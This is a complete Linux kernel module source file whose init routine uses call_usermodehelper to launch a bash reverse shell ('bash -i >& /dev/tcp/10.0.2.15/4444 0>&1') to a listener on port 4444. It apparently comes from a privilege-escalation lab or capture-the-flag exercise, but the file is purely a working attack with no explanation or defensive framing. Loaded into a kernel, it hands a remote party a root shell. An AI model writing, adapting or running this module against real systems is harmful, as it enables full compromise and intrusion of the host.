#include <linux/init.h>
#include <linux/module.h>

MODULE_LICENSE("GPL");

static int start_shell(void) {
	char *argv[]={"/bin/bash","-c","bash -i >& /dev/tcp/10.0.2.15/4444 0>&1",NULL};
	static char *env[]={
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin",NULL
	};
	
	return call_usermodehelper(argv[0],argv,env,UMH_WAIT_PROC);
}

static int init_mod(void) {
	return start_shell();
}

static void exit_mod(void) {
	return;
}

module_init(init_mod);
module_exit(exit_mod);
